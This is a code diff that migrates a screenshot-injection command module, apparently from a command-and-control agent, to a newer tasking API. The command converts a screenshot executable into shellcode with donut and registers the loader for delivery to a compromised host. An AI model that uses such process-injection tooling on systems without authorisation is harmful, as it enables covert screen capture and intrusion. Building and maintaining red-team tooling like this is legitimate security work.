@@ -98,7 +98,11 @@ class ScreenshotInjectCommand(CommandBase):
         shutil.copy(outputPath, SCREENSHOT_INJECT)
 
 
-    async def create_tasking(self, task: MythicTask) -> MythicTask:
+    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
+        response = PTTaskCreateTaskingMessageResponse(
+            TaskID=taskData.Task.ID,
+            Success=True,
+        )
         global SCREENSHOT_INJECT
         if not path.exists(SCREENSHOT_INJECT):
             await self.build_screenshotinject()
@@ -109,25 +113,24 @@ class ScreenshotInjectCommand(CommandBase):
         proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
         stdout, stderr = await proc.communicate()
         
-        command = "{} -f 1 -p \"{}\" {}".format(donutPath, task.args.get_arg("pipe_name"), SCREENSHOT_INJECT)
+        command = "{} -f 1 -p \"{}\" {}".format(donutPath, taskData.args.get_arg("pipe_name"), SCREENSHOT_INJECT)
         # need to go through one more step to turn our exe into shellcode
         proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                         stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
         stdout, stderr = await proc.communicate()
         if os.path.exists("/tmp/loader.bin"):
-            file_resp = await MythicRPC().execute(
-                "create_file",
-                task_id=task.id,
-                file=base64.b64encode(open("/tmp/loader.bin", 'rb').read()).decode(),
-                delete_after_fetch=True,
-            )
-            if file_resp.status == MythicStatus.Success:
-                task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
+            file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
+                TaskID=taskData.Task.ID,
+                FileContents=open("/tmp/loader.bin", 'rb').read(),
+                DeleteAfterFetch=True
+            ))
+            if file_resp.Success:
+                taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
             else:
-                raise Exception("Failed to register screenshot assembly: " + file_resp.error)
+                raise Exception("Failed to register screenshot assembly: " + file_resp.Error)
         else:
             raise Exception("Failed to find loader.bin")
-        return task
+        return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
         resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
